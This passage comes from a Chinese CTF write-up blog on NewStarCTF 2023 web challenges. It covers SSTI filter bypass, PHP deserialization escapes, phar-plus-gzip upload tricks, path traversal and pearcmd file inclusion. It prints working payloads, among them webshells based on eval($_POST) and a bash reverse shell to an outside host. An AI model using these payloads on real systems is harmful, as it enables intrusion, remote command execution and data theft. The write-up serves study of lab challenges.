class="hljs-string">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-number">10</span>)|attr(<span class="hljs-string">&quot;__in&quot;</span>+<span class="hljs-string">&quot;it__&quot;</span>)|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;__builtins__&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;eval&quot;</span>)(<span class="hljs-string">&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;</span>)%&#125;<br><br><br><span class="hljs-comment"># eval后面是下面这行的chr编码，可根据不同题目替换</span><br>__import_<span class="hljs-number">_</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>使用最简单的就是文件读取模块</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?<span class="hljs-built_in">name</span>=&#123;% print(().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">99</span>][<span class="hljs-string">&quot;get_data&quot;</span>](<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/flag&quot;</span>)) %&#125;<br></code></pre></td></tr></table></figure><h2 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h2><h3 id="web-逃"><a href="#web-逃" class="headerlink" title="web-逃"></a>web-逃</h3><p>php反序列化字符串逃逸</p><p>逃逸部分为:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">cmd</span><span class="language-bash"><span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-built_in">tac</span> /f*<span class="hljs-string">&quot;;&#125;</span></span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">/?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">cmd</span><span class="language-bash"><span class="hljs-string">&quot;;s:7:&quot;</span><span class="hljs-built_in">tac</span> /f*<span class="hljs-string">&quot;;&#125;</span></span><br></code></pre></td></tr></table></figure><h3 id="web-midsql"><a href="#web-midsql" class="headerlink" title="web-midsql"></a>web-midsql</h3><p>时间盲注，自己手搓了一下，但总是碰壁，最后直接用官方的打了</p><h3 id="web-More-Fast"><a href="#web-More-Fast" class="headerlink" title="web-More Fast"></a>web-More Fast</h3><p>fast_destruct</p><p>exp如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span> </span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>; <br>&#125; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span> </span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>; <br>&#125; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span> </span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;ls&quot;</span>; <br>&#125; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span> </span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>; <br>&#125; <br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>;<br><span class="hljs-variable">$obj</span> -&gt; errMsg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj -&gt; func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj -&gt; func -&gt; obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj -&gt; func -&gt; obj -&gt; func = <span class="hljs-string">&quot;system&quot;</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj -&gt; func -&gt; obj -&gt; <span class="hljs-keyword">var</span> = <span class="hljs-string">&quot;cat /f*ag&quot;</span>; <br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$obj</span>; <br><span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;i:0&quot;</span>, <span class="hljs-string">&quot;i:1&quot;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h3 id="web-flask-disk"><a href="#web-flask-disk" class="headerlink" title="web-flask disk"></a>web-flask disk</h3><p>访问admin manage发现要输入pin码，说明flask开启了debug模式。</p><p>flask开启了debug模式下，app.py源文件被修改后会立刻加载。</p><p>所以只需要上传一个能rce的app.py文件把原来的覆盖，就可以了。注意语法不能出错，否则会崩溃。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> os<br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <br>    <span class="hljs-keyword">try</span>:        <br>        cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)        <br>        data = os.popen(cmd).read()        <br>        <span class="hljs-keyword">return</span> data    <br>    <span class="hljs-keyword">except</span>:        <br>        <span class="hljs-keyword">pass</span>    <br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    <br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>上传成功后，直接在跟路由命令执行</p><h3 id="web-PharOne"><a href="#web-PharOne" class="headerlink" title="web-PharOne"></a>web-PharOne</h3><p>考点:无回显RCE，gzip压缩，phar反序列化</p><p>F12，发现class.php,得到源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br><br></code></pre></td></tr></table></figure><p>phar反序列化,用普通的phar文件上传发现不行（jpg才行）<br>修改然后上传发现被正则匹配,绕过正则匹配，用<strong>gzip压缩</strong>的方法</p><p>exp写马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd=<span class="hljs-string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br></code></pre></td></tr></table></figure><p>然后gzip命令压缩，并重命名为图片</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gzip xx<span class="hljs-selector-class">.phar</span><br>mv xx<span class="hljs-selector-class">.phar</span><span class="hljs-selector-class">.gz</span> xx.jpg<br></code></pre></td></tr></table></figure><p>上传成功后，使用phar伪协议读取上传文件，在class.php界面读</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=phar:<span class="hljs-regexp">//u</span>pload/xxxxxxxxxxxxxxxxxxxx.jpg<br></code></pre></td></tr></table></figure><p>然后再访问1.php，然后执行命令即可</p><p>还有另外一种解法:</p><p>打反弹shell，来自博主：[[NewStarCTF 2023] web题解-CSDN博客](<a href="https://blog.csdn.net/m0_73512445/article/details/133694293?ops_request_misc=%7B%22request_id%22:%22170040077916800188556960%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&amp;request_id=170040077916800188556960&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-133694293-null-null.142%5Ev96%5Epc_search_result_base5&amp;utm_term=NewStarCTF">https://blog.csdn.net/m0_73512445/article/details/133694293?ops_request_misc=%7B%22request%5Fid%22%3A%22170040077916800188556960%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=170040077916800188556960&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-133694293-null-null.142^v96^pc_search_result_base5&amp;utm_term=NewStarCTF</a> genshin&amp;spm&#x3D;1018.2226.3001.4187)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd=<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/f57819674z.imdo.co/54789 0&gt;&amp;1&#x27;&quot;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br></code></pre></td></tr></table></figure><p>和方法一差不多，先gzip压缩改后缀，然后phar伪协议读取<br>本地开启监听，然后成功反弹shell</p><h3 id="web-InjectMe"><a href="#web-InjectMe" class="headerlink" title="web-InjectMe"></a>web-InjectMe</h3><p>目录穿越+session伪造+SSTI bypass</p><p>下载附件，发现是泄露了目录<code>./app</code></p><img src="/2023/09/29/NewStarCTF_web_WP/image-20231126141211753.png" class title="image-20231126141211753"><p>点击图片，可以查看其他图片，发现有一张图片，泄露了部分源码</p><img src="/2023/09/29/NewStarCTF_web_WP/image-20231126141258694.png" class title="image-20231126141258694"><p><code>./download</code>路由下，接受GET参数file，如果没有则filename为空值，然后是过滤了<code>../</code>，由于这里是替换为空，可以绕过。然后拼接路径，如果存在则返回，结合Dockerfile泄露的目录，可以猜到运行文件，直接目录穿越读取源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/download?file=.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/app/</span>app.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br>app.secret_key = secret_key<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():  <span class="hljs-comment"># put application&#x27;s code here</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/cancanneed&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cancanneed</span>():<br>    all_filename = os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>)<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename)<br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/backdoor&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">&quot;user&quot;</span>))<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;user&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            session[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>        name = session.get(<span class="hljs-string">&quot;user&quot;</span>)<br>        <span class="hljs-keyword">if</span> re.findall(<br>                <span class="hljs-string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,<br>                name):<br>            abort(<span class="hljs-number">500</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template_string(<br>                <span class="hljs-string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)<br>    <span class="hljs-keyword">except</span> Exception:<br>        abort(<span class="hljs-number">500</span>)<br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_find</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>), <span class="hljs-number">404</span><br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">500</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">internal_server_error</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;500.html&#x27;</span>), <span class="hljs-number">500</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><img src="/2023/09/29/NewStarCTF_web_WP/image-20231126141439541.png" class title="image-20231126141439541"><p>很明显，session伪造，由源码可知密钥在config</p><img src="/2023/09/29/NewStarCTF_web_WP/image-20231126141539648.png" class title="image-20231126141539648"><p>此处backdoor的路由还存在SSTI漏洞，通过改变user的值，可以实现模板注入，所以要改session</p><p>复现的时候直接找网上的exp打了，柠檬的，实在有点复杂。</p><h3 id="web-OtenkiBoy"><a href="#web-OtenkiBoy" class="headerlink" title="web-OtenkiBoy"></a>web-OtenkiBoy</h3><h2 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h2><h3 id="web-4-复盘"><a href="#web-4-复盘" class="headerlink" title="web-4-复盘"></a>web-4-复盘</h3><p>本题跟前几周的misc有点关联的，根据前几周misc的一道流量分析题目，再加上这个源码</p><p>下载附件，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/header.php&#x27;</span>; <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/sidebar.php&#x27;</span>; <span class="hljs-meta">?&gt;</span><br><br>  &lt;!-- Content Wrapper. Contains page content --&gt;<br><br>  <span class="hljs-meta">&lt;?php</span> <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>          <span class="hljs-variable">$page</span> =<span class="hljs-string">&#x27;pages/&#x27;</span> .<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>          <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;pages/dashboard.php&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$page</span>)) &#123;<br>          <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$page</span>; <br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>          <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;pages/error_page.php&#x27;</span>;<br>        &#125;<br> <span class="hljs-meta">?&gt;</span><br>  &lt;!-- Control Sidebar --&gt;<br>  &lt;aside <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">control</span>-<span class="hljs-title">sidebar</span> <span class="hljs-title">control</span>-<span class="hljs-title">sidebar</span>-<span class="hljs-title">dark</span>&quot;&gt;</span><br><span class="hljs-class">    &lt;!-- <span class="hljs-title">Control</span> <span class="hljs-title">sidebar</span> <span class="hljs-title">content</span> <span class="hljs-title">goes</span> <span class="hljs-title">here</span> --&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">aside</span>&gt;</span><br><span class="hljs-class">  &lt;!-- /.<span class="hljs-title">control</span>-<span class="hljs-title">sidebar</span> --&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"> &lt;?<span class="hljs-title">php</span> <span class="hljs-title">require_once</span> &#x27;<span class="hljs-title">inc</span>/<span class="hljs-title">footer</span>.<span class="hljs-title">php</span>&#x27;; ?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到有文件包含漏洞，将我们传参的值与php拼接<br>（这里可以参考week3的include）</p><p>bp抓包，写入一句话木马</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?+config-create+<span class="hljs-regexp">/&amp;page=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd&amp;/&lt;?=@eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+shell.php<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AuroraCTF</title>
    <link href="/2023/09/28/AuroraWP/"/>
    <url>/2023/09/28/AuroraWP/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8fd9055daea52dab8dfcc8499a9f8dd5b735f1b6ba9b8c685fc872e72f622ea1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>CTF_WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023CNSS夏令营</title>
